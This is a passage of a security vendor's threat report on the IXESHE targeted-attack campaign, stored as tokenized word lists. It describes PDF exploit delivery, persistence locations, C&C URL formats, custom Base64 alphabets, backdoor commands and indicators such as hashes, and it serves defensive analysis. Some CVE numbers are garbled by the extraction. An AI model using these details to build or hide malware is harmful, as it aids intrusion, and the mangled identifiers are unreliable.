["malicious", "attachments", "to", "compromise", "victims\u2019", "systems", "."], ["The", "emails", "are", "often", "tailored", "for", "specific", "victims", "and"], ["contain", "malicious", "attachments", "that", "are", "almost", "always"], ["\u201cweaponized\u201d", "", ".", "PDF", "files", "with", "known", "exploits", "that", "drop"], ["malware", "executables", "onto", "targeted", "systems", ".", "In", "addition", ","], ["the", "IXESHE", "attackers", "conducted", "two", "specific", "attacks", "that"], ["leveraged", "zero-day", "exploits\u2014one", "in", "2009", "and", "another", "in"], ["2011", "."], ["1", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_luckycat_redux.pdf"], ["2", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_dissecting-lurid-apt.pdf"], ["The", "IXESHE", "attackers", "almost", "always", "make", "use", "of"], ["compromised", "servers", "as", "command-and-control", "(C&C)"], ["servers", ".", "In", "some", "cases", ",", "the", "compromised", "servers", "are"], ["hosted", "on", "target", "organizations\u2019", "networks", "after", "successful"], ["infiltration", "so", "the", "attackers", "can", "increase", "their", "control"], ["of", "the", "victims\u2019", "infrastructure", ".", "Using", "this", "approach", ",", "the"], ["attackers", "amassed", "at", "least", "60", "C&C", "servers", "over", "time", "."], ["This", "technique", "also", "allows", "the", "attackers", "to", "cover", "their"], ["tracks", ",", "as", "having", "the", "C&C", "server", "in", "the", "victims\u2019", "corporate"], ["networks", "means", "very", "little", "C&C", "traffic", "leaves", "them", ".", "The"], ["attackers\u2019", "deliberate", "use", "of", "compromised", "machines", "and"], ["dynamic", "Domain", "Name", "System", "(DNS)", "services", "allows"], ["them", "to", "hide", "traces", "of", "their", "presence", "by", "confusing", "their"], ["activities", "with", "data", "belonging", "to", "legitimate", "individuals", "."], ["Looking", "at", "threat", "intelligence", "derived", "from", "tracking", "APT"], ["campaigns", "over", "time", "primarily", "based", "on", "the", "network"], ["traffic", "generated", "by", "the", "malware", "used", ",", "we", "were", "able"], ["to", "develop", "indicators", "of", "compromise", "for", "the", "IXESHE"], ["campaign", ".", "The", "malware", "samples", "used", "in", "this", "campaign"], ["were", "not", "very", "complicated", "by", "nature", "but", "do", "give", "the"], ["attackers", "almost", "complete", "control", "over", "their", "targets\u2019"], ["compromised", "systems", "."], ["Victims", "and", "Targets"], ["Most", "of", "the", "IP", "addresses", "of", "IXESHE\u2019s", "victims", "are", "linked"], ["to", "DSL", "networks", ",", "which", "made", "it", "difficult", "to", "determine"], ["their", "identities", ".", "Careful", "research", ",", "however", ",", "allowed", "the"], ["identification", "of", "some", "of", "the", "attackers\u2019", "victims:"], ["\u2022", "East", "Asian", "governments"], ["\u2022", "Taiwanese", "electronics", "manufacturers"], ["\u2022", "A", "telecommunications", "company"], ["Campaign", "victims", "were", "identified", "by", "using", "Whois", "records"], ["and", "open", "source", "research", ".", "Trend", "Micro", "generally", "notifies"], ["customers", "that", "are", "believed", "to", "have", "been", "specifically"], ["targeted", "by", "APT", "campaigns", "."], ["Context"], ["The", "IXESHE", "attackers", "have", "been", "actively", "launching", "highly"], ["targeted", "attacks", "since", "at", "least", "July", "2009", "."], ["PAGE", "2", "|", "IXESHE"], ["Attack", "Vectors"], ["Available", "data", "on", "the", "IXESHE", "campaign", "indicates", "that"], ["targeted", "emails", "with", "malicious", "", ".", "PDF", "file", "attachments", "were"], ["the", "attackers\u2019", "vector", "of", "choice", ".", "In", "most", "cases", ",", "the", "attacks"], ["involved", "Adobe", "Acrobat", ",", "Reader", ",", "and", "Flash", "Player", "exploits"], ["such", "as:"], ["\u2022", "CVE-2009-43243"], ["\u2022", "CVE-2009-09274"], ["\u2022", "CVE-2011-06095"], ["\u2022", "CVE-2011-06116"], ["It", "should", "also", "be", "noted", "that", "this", "campaign", "used", "CVE-2009-"], ["43247"], ["and", "CVE-2011-06098", "exploits", "when", "these", "were", "still"], ["unpatched", "or", "considered", "zero-day", "vulnerabilities", "."], ["The", "IXESHE", "attackers", "also", "used", "an", "exploit", "that", "affected"], ["Microsoft", "Excel\u2014CVE-2009-3129", ".", "9"], ["Operations"], ["The", "IXESHE", "malware", "binary", "allowed", "the", "attackers", "to"], ["easily", "take", "over", "and", "maintain", "complete", "control", "of", "victims\u2019"], ["systems", "to", "do", "the", "following:"], ["\u2022", "List", "all", "services", ",", "processes", ",", "and", "drives"], ["\u2022", "Terminate", "processes", "and", "services"], ["\u2022", "Download", "and", "upload", "files"], ["\u2022", "Start", "processes", "and", "services"], ["\u2022", "Get", "victims\u2019", "user", "names"], ["\u2022", "Get", "a", "machine\u2019s", "name", "and", "domain", "name"], ["\u2022", "Download", "and", "execute", "arbitrary", "files"], ["\u2022", "Cause", "a", "system", "to", "pause", "or", "sleep", "for", "a", "specified"], ["number", "of", "minutes"], ["\u2022", "Spawn", "a", "remote", "shell"], ["\u2022", "List", "all", "current", "files", "and", "directories"], ["3", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4324"], ["4", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0927"], ["5", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0609"], ["6", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0611"], ["7", "http://contagiodump", ".", "blogspot.com/2009/12/dec-18-adobe-0-day-cve2009-4324-pdf.html"], ["8", "http://contagiodump", ".", "blogspot.ca/2011/03/cve-2011-0609-adobe-flashplayer.html"], ["9", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3129"], ["TECHNICAL", "ANALYSIS"], ["Initial", "Delivery", "Method"], ["Every", "IXESHE", "case", "we", "examined", "revealed", "that", "the", "original"], ["infection", "vector", "was", "a", "targeted", "email", "with", "a", "PDF", "exploit", "as"], ["attachment", ".", "Older", "versions", "also", "used", "an", "XLS", "exploit", "."], ["Opening", "the", "", ".", "PDF", "file", "drops", "and", "executes", "a", "malware", "in", "a"], ["victim\u2019s", "system", ".", "The", "malware", "displays", "a", "blank", "", ".", "PDF", "file", "or", "a"], ["decoy", "document", "related", "to", "the", "targeted", "attack", ".", "The", "emails"], ["normally", "come", "from", "compromised", "personal", "accounts", "or"], ["are", "entirely", "spoofed", ".", "Emails", "from", "spoofed", "senders", "were"], ["usually", "sent", "via", "mail", "servers", "in", "the", "United", "States", "and"], ["China", "."], ["Malware", "Local", "System", "Effects"], ["Once", "dropped", "onto", "target", "systems", "by", "means", "of", "a"], ["document", "exploit", "attached", "to", "a", "tailored", "email", ",", "the", "malware"], ["drops", "an", "executable", "file", "into", "one", "of", "the", "following", "folders:"], ["\u2022", "%APPDATA%\\Locations\\"], ["\u2022", "%APPDATA%\\Adobe"], ["\u2022", "%TEMP%"], ["The", "malware", "also", "sets", "the", "executable", "file\u2019s", "attributes"], ["to", "\u201cHidden", ".", "\u201d", "Some", "of", "the", "file", "names", "the", "attackers", "used"], ["include:"], ["\u2022", "winhlps", ".", "exe"], ["\u2022", "acrotry", ".", "exe"], ["\u2022", "AcroRd32", ".", "exe"], ["\u2022", "Updater", ".", "exe"], ["In", "order", "for", "the", "malware", "to", "survive", "rebooting", ",", "it", "normally"], ["creates", "the", "following", "registry", "run", "key:"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\"], ["CurrentVersion\\Run"], ["The", "registry", "run", "key", ",", "in", "turn", ",", "points", "to", "the", "malware", "that"], ["has", "been", "dropped", ".", "The", "value", "name", "of", "this", "entry", "varies"], ["from", "sample", "to", "sample", ".", "Some", "of", "the", "names", "the", "attackers"], ["used", "for", "it", "include:"], ["\u2022", "Adobe", "Assistant"], ["\u2022", "Migrated"], ["PAGE", "3", "|", "IXESHE"], ["Some", "samples", ",", "however", ",", "do", "not", "use", "a", "registry", "run", "key", "as"], ["load", "point", ".", "Some", "of", "the", "more", "recent", "samples", "we", "observed"], ["create", "a", "shortcut", "(i", ".", "e.,", "", ".", "LNK", "file)", "in", "the", "Startup", "folder", "with"], ["names", "such", "as", "adobe", "reader", "speed", "launch", ".", "lnk."], ["The", "malware", "also", "checks", "a", "system\u2019s", "proxy", "settings", "for"], ["later", "use", "in", "C&C", "communications:"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\"], ["CurrentVersion\\Internet", "Settings"], ["ProxyEnable"], ["ProxyServer"], ["C&C", "Communications"], ["Upon", "installation", ",", "the", "malware", "starts", "communicating"], ["with", "one", "of", "its", "C&C", "servers", ".", "Most", "of", "the", "samples"], ["appeared", "to", "have", "at", "least", "three", "C&C", "servers", "hard", "coded"], ["for", "redundancy", ".", "The", "C&C", "communications", "are", "easy", "to"], ["identify", ",", "as", "these", "tended", "to", "be", "coded", "in", "the", "following"], ["predetermined", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some", "Numbers]", "."], ["jsp", "?", "[Encrypted", "Base64", "Blob]"], ["Some", "samples", "alternatively", "use", "an", "FGKD", ".", "jsp", "or", "an", "FPK", ".", "jsp"], ["file", "."], ["The", "Base64", "blob", "is", "of", "particular", "interest", ".", "It", "makes", "use", "of", "a"], ["custom", "Base64", "alphabet", ".", "Once", "decoded", ",", "this", "blob", "reveals"], ["a", "standardized", "structure", "of", "the", "information", "sent", "to", "the"], ["registered", "C&C", "server", ",", "which", "includes", "the", "following", "details:"], ["\u2022", "Computer", "name"], ["\u2022", "Local", "IP", "address"], ["\u2022", "Proxy", "server", "IP", "and", "port"], ["\u2022", "Malware", "ID"], ["To", "date", ",", "we", "have", "seen", "several", "custom", "Base64", "alphabets", ","], ["including:"], ["\u2022", "+NO5RZaGHviIjhYq8b4ndQ=p012ySTcCDrs/xPgUz67F"], ["M3wemKfkJLBo9VtWXlEuA"], ["\u2022", "HZa4vjIiGndQ=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "j4vpGZaHnIdQ=i012y+N/zPgUO5RSTx67FMhYb8q3we"], ["mKckJLBofCDrs9VtWXlEu"], ["\u2022", "p12kJLBofCDrs9VtWXlEuainyj4vd+=H0GZIQNO5RST/"], ["zPgUx67FMhYb8q3wemKc"], ["\u2022", "aZHGviIj4ndQ=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "ZvQIajHi4ndG=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "ZaGHviIj4ndQ=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "4HIvZGjaiQdn=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "pGIaHnZj0vdQ=i421y+NO5RSY/zMgUx67KPhTb8q3we"], ["mFckBLJufWErs9VtCXlDo"], ["\u2022", "QpaZIivj4ndG=H021y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "pGZaHnIj4vdQ=i012y+NO5RST/zPgUx67FMhYb8q3we"], ["mKckJLBofCDrs9VtWXlEu"], ["Some", "similarities", "exist", "across", "different", "versions", "of", "the"], ["Base64", "alphabet", ",", "which", "indicates", "that", "these", "are", "most"], ["likely", "not", "completely", "randomly", "generated", ".", "Instead", ",", "the"], ["attackers", "manually", "cut", "and", "pasted", "older", "versions", "after"], ["altering", "some", "parts", "."], ["The", "malware", "ID", "seems", "to", "be", "a", "campaign", "code", "with", "a"], ["different", "IP", "address", "for", "each", "attack", ".", "Some", "of", "the", "campaign"], ["codes", "we", "have", "seen", "include:"], ["\u2022", "19"], ["\u2022", "[0222]"], ["\u2022", "[0713]"], ["\u2022", "[0802]"], ["\u2022", "[CR1008]"], ["\u2022", "[CR1031]"], ["\u2022", "[CZ0312]"], ["\u2022", "[CZ0913]"], ["\u2022", "[CZ0921]"], ["\u2022", "[LY]MAIL_20090923"], ["\u2022", "[LY]MAIL_20091015"], ["\u2022", "[LY]MAIL_20091208"], ["\u2022", "[LY0406]"], ["\u2022", "[LY0420]"], ["\u2022", "[LY0816]"], ["\u2022", "[LY1207]"], ["\u2022", "[TL1109]"], ["\u2022", "[WH0827]"], ["\u2022", "[WH1122]"], ["\u2022", "[WL1013]"], ["\u2022", "[WZ1011]"], ["\u2022", "CRML_0505"], ["\u2022", "CRML_MIL"], ["\u2022", "Firebox4"], ["\u2022", "JUST_0525"], ["\u2022", "JUST_JP_6080"], ["\u2022", "KA_1016"], ["\u2022", "KS_0602"], ["\u2022", "KSX_0520"], ["\u2022", "LY_ML0430_30m"], ["\u2022", "ly0610"], ["\u2022", "MAIL_20091208"], ["\u2022", "MAIL_JAP_0220"], ["\u2022", "MAIL_JAP_0304"], ["\u2022", "MAIL_JAP_0325"], ["\u2022", "MAIL_JAP_0407"], ["\u2022", "MAIL0524"], ["\u2022", "manufact"], ["\u2022", "ML_20091223"], ["\u2022", "ML0419", ".", "_30m"], ["\u2022", "ML0623", ".", "LINK_10m"], ["\u2022", "ML0628"], ["\u2022", "ML_20091216"], ["\u2022", "ML_20091223"], ["\u2022", "MW0629"], ["\u2022", "OM222"], ["\u2022", "sandbox"], ["\u2022", "sandbox4"], ["\u2022", "sandbox6"], ["\u2022", "success"], ["\u2022", "UNKNOWN"], ["\u2022", "wl0711"], ["\u2022", "ZWJP_KS_1222"], ["It", "appears", "that", "the", "numbers", "in", "the", "given", "campaign", "codes"], ["refer", "to", "dates", "when", "the", "campaigns", "were", "launched", "in"], ["\u201cMMDD\u201d", "format", ".", "The", "letters", "are", "possibly", "related", "to", "the"], ["target", "industry", "or", "company", "."], ["PAGE", "4", "|", "IXESHE"], ["If", "the", "malware", "does", "not", "get", "a", "response", "from", "the", "C&C"], ["server", ",", "it", "will", "choose", "another", "random", "number", "after", "the"], ["AWS", "part", "of", "the", "URL", "and", "try", "again", "."], ["Once", "connected", ",", "the", "malware", "specifically", "waits", "for", "the"], ["remote", "server", "to", "issue", "the", "following", "commands", ",", "which"], ["may", "vary", "from", "one", "version", "to", "another:"], ["\u2022", "del", "[parameter]:", "Allows", "a", "remote", "user", "to", "delete", "files", "."], ["\u2022", "disk", "[parameter]:", "Lists", "all", "available", "drives", "."], ["\u2022", "dos", "[parameter]:", "Allows", "a", "remote", "user", "to", "execute"], ["commands", "via", "cmd", ".", "exe."], ["\u2022", "get", "[parameter]:", "Allows", "a", "remote", "user", "to", "download", "a"], ["file", "from", "the", "remote", "server", "onto", "a", "local", "machine", "."], ["\u2022", "list", "[parameter]:", "Lists", "files", "on", "the", "victim\u2019s", "machine", "."], ["\u2022", "ls", "[parameter]:", "Allows", "a", "remote", "user", "to", "display", "the"], ["contents", "of", "a", "directory", "."], ["\u2022", "kill", "[parameter]:", "Allows", "a", "remote", "user", "to", "terminate"], ["processes", "."], ["\u2022", "put", "[parameter]:", "Allows", "a", "remote", "user", "to", "upload", "a", "file"], ["from", "a", "local", "machine", "to", "a", "remote", "server", "."], ["\u2022", "rsh", "[parameter]:", "Similar", "to", "the", "sh", "or", "dos", "[parameter]"], ["except", "for", "the", "fact", "that", "this", "is", "an", "already-existing", "file"], ["or", "shell", "."], ["\u2022", "run", "[parameter]:", "Allows", "a", "remote", "user", "to", "execute"], ["programs", "."], ["\u2022", "sh", "[parameter]:", "Allows", "a", "remote", "user", "to", "execute"], ["commands", "via", "cmd", ".", "exe."], ["\u2022", "sleep", "[parameter]:", "Causes", "a", "system", "to", "sleep", "for", "a"], ["certain", "amount", "of", "time", "."], ["Related", "AES", "Campaign"], ["We", "have", "also", "been", "tracking", "another", "campaign", ",", "which"], ["we", "refer", "to", "as", "the", "\u201cAES", "campaign", ",", "\u201d", "which", "appears", "to", "be"], ["related", "to", "IXESHE", ".", "The", "main", "body", "of", "the", "malware", "related"], ["to", "the", "IXESHE", "campaign", "can", "be", "identified", "by", "its", "connection"], ["to", "a", "C&C", "server", "using", "a", "file", "such", "as", "AWS12345", ".", "jsp", "and", "a"], ["custom", "Base64", "blob;", "the", "malware", "associated", "with", "the"], ["AES", "campaign", "operates", "very", "similarly", ".", "The", "samples", "used"], ["in", "the", "AES", "campaign", "slightly", "differed", "in", "terms", "of", "C&C"], ["communication", "but", "had", "significant", "similarities", "with", "IXESHE"], ["malware", ",", "which", "used", "the", "format:"], ["http://[C&C", "Server]/[ACD]", "ES[Some", "Numbers]", ".", "jsp"], ["Even", "though", "the", "network", "traffic", "format", "of", "the", "AES"], ["campaign", "was", "slightly", "similar", ",", "instead", "of", "the", "more", "familiar"], ["AWS[random]", ".", "jsp", "format", ",", "it", "used", "several", "other", "formats", "for"], ["certain", "commands", "or", "events", "such", "as:"], ["\u2022", "AES:", "Initial", "beacon", "."], ["\u2022", "DES:", "Send", "the", "path", "of", "%systemdir%", "."], ["\u2022", "PES:", "Send", "the", "result", "of", "the", "\u201cput\u201d", "command", "."], ["\u2022", "SEU:", "Send", "the", "\u201cerror\u201d", "or", "\u201cinvalid\u201d", "command", "."], ["\u2022", "SUS:", "Send", "the", "system", "name", ",", "which", "is", "not", "encoded", ","], ["upon", "receiving", "the", "\u201cexit\u201d", "command", "."], ["\u2022", "ZES:", "Send", "the", "result", "of", "the", "\u201cdos\u201d", "command", "."], ["Another", "difference", "in", "the", "traffic", "is", "that", "AWS", "uses", "the", "POST"], ["method", "with", "the", "format", ",", "\u201chttp://[C&C", "Server]/FPK", "[Some"], ["Numbers]", ".", "jsp?[Base64", "Blob]", ",", "\u201d", "when", "the", "\u201cget\u201d", "command", "is"], ["invoked", ".", "The", "Base64", "blob", "contains", "the", "file", "specified", "in", "the"], ["\u201cget\u201d", "command", "."], ["Analysis", "of", "the", "binaries", "also", "revealed", "similarities", "between"], ["the", "AES", "and", "AWS", "samples", ".", "These", "included", "the", "encoding"], ["algorithm", "and", "commands", "used", ".", "Even", "though", "some"], ["commands", "varied", ",", "the", "format", "and", "parameters", "used"], ["essentially", "remained", "the", "same", "."], ["PAGE", "5", "|", "IXESHE"], ["C&C", "INFRASTRUCTURE"], ["The", "majority", "of", "the", "IXESHE", "campaign\u2019s", "C&C", "servers", "were", "based", "in", "Taiwan", "and", "the", "United", "States", "."], ["Figure", "1", ".", "Breakdown", "of", "C&C", "servers", "by", "country"], ["PAGE", "6", "|", "IXESHE"], ["This", "is", ",", "however", ",", "not", "an", "indicator", "of", "attribution", ".", "It", "is", "not"], ["possible", "to", "determine", "where", "the", "attackers", "are", "based", "solely"], ["on", "where", "their", "C&C", "infrastructures", "are", "located", ".", "In", "addition", ","], ["not", "all", "of", "the", "C&C", "servers", "are", "currently", "active", ".", "Many", ",", "if"], ["not", "all", "of", "them", ",", "appear", "to", "be", "compromised", "machines", ".", "In"], ["fact", ",", "at", "least", "11", "of", "the", "C&C", "servers", "were", "hosted", "on", "the"], ["compromised", "machines", "of", "an", "East", "Asian", "government", ","], ["which", "made", "these", "very", "useful", "for", "launching", "targeted"], ["attacks", "against", "it", "."], ["Most", "of", "the", "malware", "samples", "directly", "accessed", "an", "IP"], ["address", "as", "a", "C&C", "server", ".", "Connections", "to", "domains", "did"], ["exist", "in", "some", "cases", ".", "The", "domains", "were", "usually", "registered"], ["using", "free", "dynamic", "DNS", "service", "providers", "or", "compromised"], ["websites", "."], ["Overall", ",", "this", "strategy", "was", "part", "of", "the", "attackers\u2019", "modus"], ["operandi", ".", "By", "choosing", "compromised", "machines", "to", "act", "as"], ["C&C", "servers", ",", "fewer", "clues", "were", "left", "for", "investigators", "to"], ["follow", "in", "an", "attempt", "to", "find", "out", "who", "is", "behind", "the", "attacks"], ["compared", "with", "those", "using", "bulletproof", "hosting", "services"], ["and", "registered", "domain", "names", ".", "To", "conduct", "research", "on"], ["these", "servers", ",", "investigators", "need", "to", "differentiate", "between"], ["information", "related", "to", "malicious", "and", "legitimate", "use", "."], ["Real", "C&C", "Location"], ["One", "very", "interesting", "error", "revealed", "more", "insights", "into"], ["the", "C&C", "network\u2019s", "setup", ".", "One", "of", "the", "malware", "samples", "we"], ["tested", "was", "designed", "to", "access", "xxx", ".", "xxawan.com", "via", "port"], ["443", ",", "which", ",", "at", "that", "time", ",", "resolved", "to", "xx", ".", "xxx.114.87:443,", "a"], ["server", "located", "in", "the", "United", "States", ".", "The", "sample", ",", "however", ","], ["received", "the", "following", "error", "message", "from", "the", "server:"], ["[SERVER]connection", "to", "xx", ".", "xx.x2.202:56413", "error"], ["This", "indicated", "that", "the", "front-end", "servers", "actually"], ["functioned", "as", "proxy", "servers", "and", "that", "the", "true", "C&C", "servers"], ["were", "hidden", "behind", "this", "initial", "group", "of", "C&C", "servers", "."], ["This", "made", "the", "network", "more", "resistant", "to", "takedown", "and"], ["analysis", ".", "Due", "to", "a", "server", "error", ",", "however", ",", "the", "attackers"], ["revealed", "the", "location", "of", "one", "of", "their", "back-end", "servers", ".", "We"], ["discovered", "that", "the", "IP", "address", ",", "xx", ".", "xx.x2.202,", "is", "located", "in"], ["Guangdong", ",", "China", "."], ["The", "particular", "error", "returned", "looked", "very", "similar", "to", "errors"], ["generated", "by", "a", "tool", "called", "\u201cHTran", ".", "\u201d10", "HTran", "stands", "for"], ["\u201cHUC", "Packet", "Transmit", "Tool", ",", "\u201d", "a", "connection", "bouncer", "that"], ["redirects", "TCP", "traffic", "destined", "for", "one", "host", "to", "an", "alternate"], ["host", ",", "keeping", "the", "real", "host", "hidden", "from", "view", ".", "\u201cHUC", ",", "\u201d", "in"], ["this", "case", ",", "stands", "for", "the", "hacking", "group", ",", "\u201cHonker", "Union"], ["of", "China", ".", "\u201d", "It", "was", "coded", "by", "a", "hacker", "who", "goes", "by", "the"], ["handle", "\u201clion", ".", "\u201d", "This", "tool\u2019s", "error-checking", "code", ",", "however", ",", "is"], ["flawed", ".", "Assuming", "that", "everything", "properly", "works", ",", "the", "tool"], ["functions", "very", "well", "as", "a", "proxy", "server", "but", "if", "the", "real", "server"], ["is", "currently", "inaccessible", ",", "HTran", "will", "send", "an", "error", "message", ","], ["revealing", "its", "whereabouts", "."], ["Running", "a", "port", "scan", "on", "this", "server", "revealed", "some", "open"], ["ports", "shown", "in", "the", "table", "below", "."], ["Port", "State", "Service"], ["80/tcp", "Open", "HTTP"], ["8080/tcp", "Open", "HTTP", "Alternative"], ["Based", "on", "OS", "fingerprinting", ",", "the", "server", "appears", "to", "be"], ["running", "Windows", "7", "Enterprise", "Server", ".", "With", "only", "a", "few"], ["open", "ports", ",", "however", ",", "it", "was", "very", "difficult", "to", "confirm", "this", ".", "In"], ["addition", ",", "we", "did", "not", "receive", "a", "response", "when", "we", "tried", "to"], ["connect", "to", "these", "ports", "."], ["10", "http://www", ".", "secureworks.com/research/threats/htran/"], ["PAGE", "7", "|", "IXESHE"], ["ATTRIBUTION", "AND", "UNIQUE"], ["FINGERPRINTS"], ["Previous", "research", "on", "the", "IXESHE", "campaign", "indicated"], ["several", "connections", "to", "groups", "possibly", "from", "China", ".", "In"], ["addition", ",", "the", "IP", "address", "hiding", "behind", "the", "HTran", "instance"], ["was", "an", "IP", "range", "assigned", "to", "China", "."], ["Upon", "further", "investigation", "of", "the", "\u201cmanufact\u201d", "campaign", ","], ["however", ",", "it", "appears", "that", "the", "gang", "behind", "it", "may", "be", "English"], ["speakers", ".", "The", "name", "of", "the", "campaign", ",", "for", "one", ",", "is", "most", "likely"], ["a", "shortened", "form", "of", "\u201cmanufacturing", ".", "\u201d", "The", "OS", "the", "C&C"], ["server", "uses", "is", "also", "an", "English", "install", "of", "Microsoft", "XP", ".", "It", "is"], ["also", "likely", ",", "of", "course", ",", "that", "the", "C&C", "server", "is", "a", "compromised"], ["machine", "so", "it", "does", "not", "use", "the", "attackers\u2019", "first", "language", "."], ["The", "malware", "samples", ",", "which", "appear", "to", "have", "been"], ["developed", "using", "C++", ",", "had", "a", "number", "of", "strings", "and", "error"], ["codes", "in", "English", "such", "as", "\u201cEnter", "command\u201d", "and", "\u201cReceive"], ["command", "error", "!", "\u201d"], ["The", "date", "format", "used", "in", "the", "campaign", "codes", "(i", ".", "e.,", "MMDD)"], ["also", "provided", "us", "a", "clue", "as", "to", "where", "the", "attackers", "may", "be"], ["from", ".", "This", "date", "format", "is", "only", "commonly", "used", "in", "China", ","], ["Korea", ",", "Iran", ",", "Japan", ",", "Hungary", ",", "Lithuania", ",", "and", "the", "United"], ["States", "."], ["Based", "on", "the", "limited", "amount", "of", "information", "we", "gathered"], ["about", "the", "attackers", ",", "it", "was", "very", "difficult", "to", "pinpoint", "their"], ["exact", "location", "."], ["Unique", "Fingerprints", "and", "Modus", "Operandi"], ["An", "attack", "can", "be", "considered", "associated", "with", "the", "gang"], ["behind", "the", "IXESHE", "campaign", "if", "it", "exhibits", "the", "following"], ["characteristics:"], ["\u2022", "Uses", "a", "specially", "crafted", "targeted", "email", "with", "a"], ["malicious", "file", "attachment"], ["\u2022", "Uses", "document", "exploits", ",", "primarily", "", ".", "PDF", "files", ",", "to", "drop"], ["malware", "into", "target", "systems"], ["\u2022", "Uses", "malware", "detected", "by", "security", "vendors", "as", "IXESHE"], ["variants"], ["\u2022", "Uses", "a", "malware", "that", "sends", "a", "GET", "request", "to", "the", "C&C"], ["server", "in", "the", "following", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some"], ["Numbers]", ".", "jsp?[Encrypted", "Base64", "Blob]"], ["\u2022", "Uses", "dynamic", "DNS", "services", "for", "or", "compromised"], ["machines", "as", "C&C", "servers"], ["PAGE", "8", "|", "IXESHE"], ["RELATIONSHIPS", "BETWEEN", "ATTACK", "COMPONENTS"], ["Figure", "2", ".", "IXESHE", "targeted", "campaign", "#1"], ["Figure", "3", ".", "IXESHE", "targeted", "campaign", "#2"], ["PAGE", "9", "|", "IXESHE"], ["Figure", "4", ".", "IXESHE", "targeted", "campaign", "#3"], ["PAGE", "10", "|"], ["IXESHE"], ["Figure", "5", ".", "IXESHE", "targeted", "campaign", "#4"], ["Figure", "6", ".", "IXESHE", "targeted", "campaign", "#5"], ["PAGE", "11", "|", "IXESHE"], ["PAGE", "12", "|", "IXESHE"], ["TIMELINE"], ["This", "section", "lists", "known", "incidents", "exhibiting", "the", "same"], ["threat", "actor", "behaviors", "and", "so", "may", "be", "from", "the", "same"], ["group", "behind", "IXESHE", "dating", "to", "as", "far", "back", "as", "July"], ["2009", ".", "With", "the", "exception", "of", "the", "samples", "described", "in"], ["ContagioDump", ",", "the", "dates", "for", "other", "samples", "refer", "to", "when"], ["the", "respective", "sandboxes", "saw", "them", "for", "the", "first", "time", ".", "As"], ["such", ",", "these", "dates", "should", "be", "considered", "\u201cat", "least", "by\u201d", "and"], ["not", "the", "actual", "date", "of", "the", "attack", "."], ["\u2022", "15", "October", "2009"], ["\u2022", "PDF", "name/Subject", "hook:", "\u4e2d\u5171\u4e8c\u70ae\u90e8\u968a\u5c0e\u5f48\u4e4b\u767c\u5c55"], ["\u2022", "MD5:", "16a9f340c0d353332ba6f525376c93e1"], ["\u2022", "C&C:", "xxxxxupsenter", ".", "byinter.net"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2009/12/"], ["oct-15-2009-attack-of-day-development", ".", "html"], ["\u2022", "Campaign", "code:", "[LY]MAIL_20091015"], ["\u2022", "18", "December", "2009"], ["\u2022", "PDF", "name/Subject", "hook:", "\u5973\u5175\u812b\u8863\u6bd4\u4e2d\u6307", "\u62cd\u7167PO"], ["\u4e0a\u7db2"], ["\u2022", "MD5:", "8950bbedf4a7f1d518e859f9800f9347"], ["\u2022", "C&C:", "xxxxxfo", ".", "athersite.com"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2009/12/"], ["dec-18-adobe-0-day-cve-2009-4324-pdf", ".", "html"], ["\u2022", "Campaign", "code:", "ML_20091216"], ["\u2022", "28", "December", "2009"], ["\u2022", "PDF", "name/Subject", "hook:", "Consumer", "Welfare", "Table"], ["\u2022", "MD5:", "c61c231d93d3bd690dd04b6de7350abb"], ["\u2022", "C&C:", "xxx", ".", "xx6.148.42", "or", "xxx", ".", "xx6.202.49"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2009/12/"], ["dec-29-cve-2009-4324-adobe-0-day", ".", "html"], ["\u2022", "Campaign", "code:", "ML_20091223"], ["\u2022", "26", "April", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "[\u7814\u8a0e\u6703]\u958b\u5357\u5927\u5b78\u516c\u5171\u4e8b"], ["\u52d9\u7ba1\u7406\u5b78\u7cfb\u7b2c\u4e94\u5c46\u300c\u5168\u7403\u5316\u8207\u884c\u653f\u6cbb\u7406\u300d\u570b\u969b\u5b78\u8853"], ["\u7814\u8a0e\u6703"], ["\u2022", "MD5:", "58de08c1155a775b760049dff3f5abe4"], ["\u2022", "C&C:", "xxx", ".", "x.x5.26"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/04/"], ["apr-26-cve-2009-4324-w-low-detection", ".", "html"], ["\u2022", "Campaign", "code:", "ML0419", ".", "_30m"], ["\u2022", "6", "May", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "\u8521\u653f\u6587\u6559\u6388\u4e03\u5341\u83ef\u8a95\u7cfb\u5217"], ["\u6d3b\u52d5\u7c21\u5831"], ["\u2022", "MD5:", "d80eb21cfe8ad1a710c8652b13f8b7ac"], ["\u2022", "C&C:", "xxx", ".", "xx9.124.13"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/05/"], ["may-6-cve-2010-0188-pdf-birthday", ".", "html"], ["\u2022", "Campaign", "code:", "LY_ML0430_30m"], ["\u2022", "10", "May", "2010"], ["\u2022", "XLS", "name/Subject", "hook:", "99\u4e0b\u534a\u5e74\u570b\u9632\u5de5\u696d\u8a55\u9451"], 